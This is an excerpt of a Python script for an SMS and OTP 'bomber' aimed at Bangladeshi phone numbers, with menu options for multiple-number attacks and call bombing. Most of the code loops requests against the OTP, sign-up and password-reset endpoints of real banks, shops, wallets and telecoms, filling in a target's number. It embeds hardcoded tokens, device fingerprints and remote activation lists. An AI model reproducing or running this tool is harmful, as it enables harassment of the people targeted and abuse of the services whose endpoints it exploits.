...
colorArr1 = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
colorArr2 = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
colorArr3 = ["\033[1;91m", "\033[1;92m", "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
colorArr4 = ["\033[1;92m", "\033[1;93m", "\033[1;94m"]
# clear
def clr():
    if os.name == 'nt':
        os.system('cls')
...
def yt():
    if os.name == 'nt':
        webbrowser.open(' https://youtube.com/@s14mbro69')
    else:
        os.system('xdg-open  https://youtube.com/@s14mbro69')
# Char Print
...
try:
    numbers = str.split(requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Data/main/protract.txt').text)
    # LIMIT GET
    global limit_str
    limit_str = requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Data/main/limit.txt').text
    global time_speed
    time_s = requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Data/main/time.txt').text
...
def banner():
    s = random.choice(colorArr1)
    i = random.choice(colorArr2)
    a = random.choice(colorArr3)
    m = random.choice(colorArr4)
    logo = f'''
...
def option_premium():
    ...
    [4] MY GP 
    [5] CIRCLE PIN
    [6] ATTACK FROM SINGLE SERVER
    [7] MUTIPLE NUMBER ATTACK
    [8] MULTIPLE NUMBER ATTACK MY ROBI/MY AIRTEL
    [9] CALL BOMBING
    ''' + end
...
def sent_pin(number, amount):
    myAtt = requests.get("https://raw.githubusercontent.com/SIAMRAHMAN000/Data/main/myTar.txt").text
    phone = "+88" + number
   ...
   {infoC} ══════════════════════════════════════
    ...
    while i < amount:
        ...
        try:
            ...
            data_nescoM = "phone_number=" + numberTwo
            requ_nesco_serverM = requests.post(url_nesco, headers=headers_nesco, data=data_nescoM)
        ...
        try:
            ...
            data_mokamM = '{"direct_login": true,"user": {"resend": false,"login": "88' + numberTwo + '","type": {"register": true}}}'
            requ_mokam_serverM = requests.post(url_mokam, headers=headers_mokam, data=data_mokamM)
        ...
        try:
            ...
            data_redXM = '{"name":"' + number + '","phoneNumber":"' + numberTwo + '","service":"redx"}'
            requ_redX_server = requests.post(url_redX, headers=headers_redX, data=data_redXM)
            time.sleep(1)
        ...
        try:
            ...
            url_bikroyM = "https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=" + numberTwo
            headers_bikroy = {"Application-Version":"311","Application-Name":" android"}
            requ_bikroy_serverM = requests.get(url_bikroyM,headers=headers_bikroy)
            requ_bikroy_server = requests.get(url_bikroy,headers=headers_bikroy)
        ...
        try:
            ...
            data_web_one = '{"shortcode":"2494905","msisdn":"88' + numberTwo + '"}'
        ...
        try:
            ...
            data_web_two = '{"shortcode":"2494905","msisdn":"88' + numberTwo + '"}'
        ...
        try:
            ...
            data_arogga = "mobile=%2B88" + numberTwo + "&fcmToken=dfixXPTmTeSRBAFf-utxA-%253AAPA91bG1chvzjost2jd7UNgNeQFJ3s-0ynvXZs4Mat3RuXF0xz4c1yMMn83TL-pwVmAP7NIG45l4M-uJ0JK3n9r5kiDmMI_M6_wkN37O8arFojbXXljcRfj9YgY0jX-SJuumo36V5m8s&referral="
        ...
        try:
            ...
            data_sahjalal = '{"AccessToken":"","TrackingNo":"","mobileNo":"' + numberTwo + '","otpSms":"","product_id":"121","requestChannel":"MOB","trackingStatus":5}'
        ...
        try:
            ...
            data_ebl = "vcCustName=Pudina&vcCustEmail=Fuck%40gmail.com&vcCustMob=" + numberTwo + "&vcPassword=12345678&confirmPassword=12345678"
            ...
            pass
        try:
            url_dipto = "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web"
            headers_dipto = {"Content-Length" : "23",
            ...
            data_dipto = '{"number":"'+number[1:11]+'"}'
            requ_dipto_server = requests.post(url_dipto, headers=headers_dipto, data=data_dipto)
            if requ_dipto_server.json()['success'] == True:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
            ...
            pass
        try:
            url_hasebpati = "https://api.hishabpati.com/api/v1/merchant/register/otp"
            headers_hasebpati = {"Content-Type" : "application/json"}
            data_hasebpati = '{"business_name":"SIAM","first_name":"Mr ","last_name":"Rahman","phone_number":"'+ numberTwo + '"}'
            requ_hasebpati_server = requests.post(url_hasebpati, headers=headers_hasebpati, data=data_hasebpati)
            data_hasebpati = '{"business_name":"SIAM","first_name":"Mr ","last_name":"Rahman","phone_number":"'+ number + '"}'
            requ_hasebpati_server = requests.post(url_hasebpati, headers=headers_hasebpati, data=data_hasebpati)
            if requ_hasebpati_server.json()['status'] == True:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        # KIri Shop
        try:
            url_kriShop = "https://retailer.ifarmer.asia/api/v1/retailers/sign_up"
            headers_kriShop = {"Content-Type": "application/x-www-form-urlencoded"}
            data_kriShop = 'phone=%2B88' + numberTwo
            requ_kriShop_server = requests.post(url_kriShop, headers=headers_kriShop, data=data_kriShop)
            data_kriShop = 'phone=%2B88'+number
            requ_kriShop_server = requests.post(url_kriShop, headers=headers_kriShop, data=data_kriShop)
            if requ_kriShop_server.status_code == 201:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            url_monach = "https://api.monarchmart.com/auth/customer/otp/send"
            headers_monach = {"Content-Type": "application/json"}
            data_monach = '{"phone":"88' + numberTwo + '"}'
            requ_monach_server = requests.post(url_monach, headers=headers_monach, data=data_monach)
            data_monach = '{"phone":"88' +number+ '"}'
            requ_monach_server = requests.post(url_monach, headers=headers_monach, data=data_monach)
        ...
        try:
            url_rfl = "https://rflbestbuy.com/api/extendedusers/?lang_code=en&currency_code=BDT"
            headers_rfl = {"Content-Type": "application/json","Authorization":"Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ=="}
            data_rfl = '{"email":"","forget_password":true,"lang_code":"en","phone":"'+numberTwo+'","reset_with_otp":"Y","storefront_id":"3"}'
            requ_rfl_server = requests.post(url_rfl, headers=headers_rfl, data=data_rfl)

            data_rfl = '{"email":"","forget_password":true,"lang_code":"en","phone":"'+number+'","reset_with_otp":"Y","storefront_id":"3"}'
            requ_rfl_server = requests.post(url_rfl, headers=headers_rfl, data=data_rfl)
            if requ_rfl_server.status_code == 201:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
        ...
        try:
            ...
            data_uttara = '{"AccessToken":"","TrackingNo":"","mobileNo":"' + numberTwo + '","otpSms":"","product_id":"111","requestChannel":"MOB","trackingStatus":5}'
        ...
        try:
            ...
            "Accept-Encoding" : "gzip, deflate",
            "Content-Length" : "638"}
            data_dmoney = '{"clientType":"dmoney-customer-wallet","dateOfBirth":"04\/11\/1996","email":"siam1234@yahoo.com","fullName":"SIAM","mobileNumber":"' + numberTwo + '","operatorCode":"3","pin":"qLg\/BH8nl1IzjzVtgPx8mQ==","pinHMac":"mwUD43\/XYDBN4gs0fMQxtBJqVGSod2NZRlUvq6QnN4E=","referralCode":"","userType":"5","deviceName":"OnePlus A5010 Android 7.1.2","deviceNumber":"e57cd87b2c9b47b1","hardwareSignature":"20ad24ea74d4efdbf96413fb97f428cd6227f157610655ebeeb6c87d2b8bbd9bbdd0a343b4ba09ddda9b69de8bf5770edb618e3820bf0ff7fb8d777612a7f0f1","mobileAppVersion":"2.2.2_DM","mobileAppVersionCode":53,"productCode":"DM","requestId":"42EE607762F2F08A","sessionToken":""}'
            requ_dmoney_server = requests.post(url_dmoney, headers=headers_dmoney, data=data_dmoney)
            time.sleep(1)
            data_dmoney = '{"clientType":"dmoney-customer-wallet","dateOfBirth":"04\/11\/1996","email":"siam1234@yahoo.com","fullName":"SIAM","mobileNumber":"'+number+'","operatorCode":"3","pin":"qLg\/BH8nl1IzjzVtgPx8mQ==","pinHMac":"mwUD43\/XYDBN4gs0fMQxtBJqVGSod2NZRlUvq6QnN4E=","referralCode":"","userType":"5","deviceName":"OnePlus A5010 Android 7.1.2","deviceNumber":"e57cd87b2c9b47b1","hardwareSignature":"20ad24ea74d4efdbf96413fb97f428cd6227f157610655ebeeb6c87d2b8bbd9bbdd0a343b4ba09ddda9b69de8bf5770edb618e3820bf0ff7fb8d777612a7f0f1","mobileAppVersion":"2.2.2_DM","mobileAppVersionCode":53,"productCode":"DM","requestId":"42EE607762F2F08A","sessionToken":""}'
            requ_dmoney_server = requests.post(url_dmoney, headers=headers_dmoney, data=data_dmoney)
...
def main():
    ck_act = requests.get('https://raw.githubusercontent.com/SIAMRAHMAN000/Data/main/active-v-2.1.6').text
    # ck_act = 'active'
    clr()
    if 'active' in ck_act:
        pass
    else:
        printchar(f'{yellowBold}  {requests.get("https://raw.githubusercontent.com/SIAMRAHMAN000/Data/main/message-v-2.1.6").text}', 0.005)
        sys.exit()
    banner()
    option()
...
def attack_premium():
    ...
    if option_choosed == '1' or option_choosed == '01':
        ...
        custom()
    elif option_choosed == '09' or option_choosed == '9':
        call_bomb()
    else:
        attack_premium()
...
def sent_pin_pre(number, amount,oparetor):
    ...
    bombInfo = (f'{infoC}\n'
                ...
                f'    ')
    clr()
    print(random.choice(colorArr)+"Premium not updated")
    time.sleep(3)
    clr()
    banner_premium()
    print(bombInfo)
    ...
    while i < amount:
        ...
        try:
            ...
            data_rfl = '{"email":"","forget_password":true,"lang_code":"en","phone":"'+number+'","reset_with_otp":"Y","storefront_id":"3"}'
            requ_rfl_server = requests.post(url_rfl, headers=headers_rfl, data=data_rfl)
            if requ_rfl_server.status_code == 200:
                i += 1
                print_text = "[" + str(i) + "]"
                sys.stdout.write(print_text)
                sys.stdout.flush()
...
def att(number_multi):
    ...
    for num in numbers_all:
        ...
        try:
            ...
            headers_dmoney = {
                ...
                "Accept-Encoding": "gzip, deflate",
                "Content-Length": "638"}
            data_dmoney = '{"clientType":"dmoney-customer-wallet","dateOfBirth":"04\/11\/1996","email":"siam1234@yahoo.com","fullName":"SIAM","mobileNumber":"' + num + '","operatorCode":"3","pin":"qLg\/BH8nl1IzjzVtgPx8mQ==","pinHMac":"mwUD43\/XYDBN4gs0fMQxtBJqVGSod2NZRlUvq6QnN4E=","referralCode":"","userType":"5","deviceName":"OnePlus A5010 Android 7.1.2","deviceNumber":"e57cd87b2c9b47b1","hardwareSignature":"20ad24ea74d4efdbf96413fb97f428cd6227f157610655ebeeb6c87d2b8bbd9bbdd0a343b4ba09ddda9b69de8bf5770edb618e3820bf0ff7fb8d777612a7f0f1","mobileAppVersion":"2.2.2_DM","mobileAppVersionCode":53,"productCode":"DM","requestId":"42EE607762F2F08A","sessionToken":""}'
            requ_dmoney_server = requests.post(url_dmoney, headers=headers_dmoney, data=data_dmoney)
            if requ_dmoney_server.status_code == 200:
    ...
    for num in numbers_all:
        ...
        try:
            url_sahjalal = "https://eaccount.sjiblbd.com/VerifIDEXT/api/CustOnBoarding/VerifyMobileNumber"
            headers_sahjalal = {"Content-Type": "application/json",}
            data_sahjalal = '{"AccessToken":"","TrackingNo":"","mobileNo":"'+num+'","otpSms":"","product_id":"121","requestChannel":"MOB","trackingStatus":5}'
            requ_sahjalal_server = requests.post(url_sahjalal, headers=headers_sahjalal, data=data_sahjalal)
            if requ_sahjalal_server.json()['message'] == 'OTP Generated':
    ...
    for num in numbers_all:
        try:
            ...
            headers_dipto = {"Content-Length": "23",
                             ...
                             "Sec-Fetch-Mode": "cors",
                             "Referer": "https://www.deeptoplay.com/"}
            data_dipto = '{"number":"' + num[1:11] + '"}'
            requ_dipto_server = requests.post(url_dipto, headers=headers_dipto, data=data_dipto)
            if requ_dipto_server.json()['success'] == True:
                printchar(f"{greenBold}    A SMS SENT FROM DIPTO IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM DIPTO IN +888{num}", 0.001)
        except:
            pass
        try:
            url_hasebpati = "https://api.hishabpati.com/api/v1/merchant/register/otp"
            headers_hasebpati = {"Content-Type": "application/json", }
            data_hasebpati = '{"business_name":"BEN TEN","first_name":"Mr ","last_name":"Bean","phone_number":"' + number + '"}'
            requ_hasebpati_server = requests.post(url_hasebpati, headers=headers_hasebpati, data=data_hasebpati)
            if requ_hasebpati_server.json()['status'] == True:
                printchar(f"{greenBold}    A SMS SENT FROM HIASABPATI IN +888{num}", 0.001)
            else:
                printchar(f"{redBold}    A SMS NOT SENT FROM HISABPATI BANK IN +888{num}", 0.001)
        except:
            pass
...
def robi_airtel_multi():
    ...
    while True:
        print("\n")
        att_robi(number_multi)

def att_robi(number_multi):
    numbers_all = str.split(number_multi)
    if len(numbers_all) == 0:
        sys.exit()
    else:
        for number in numbers_all:
            try:
                ...
                requ_my_robi_server = requests.post(url_my_robi, headers=headers_my_robi, data=data_my_robi)
                if requ_my_robi_server.json()["content"] == "Otp successfully send to user":
                    printchar(f"{greenBold}    A SMS SENT IN +888{number}", 0.001)
                else:
                    printchar(f"{redBold}    A SMS NOT SENT IN +888{number}", 0.001)
            except:
                pass
def upai(number):
    op_v = number[:3]
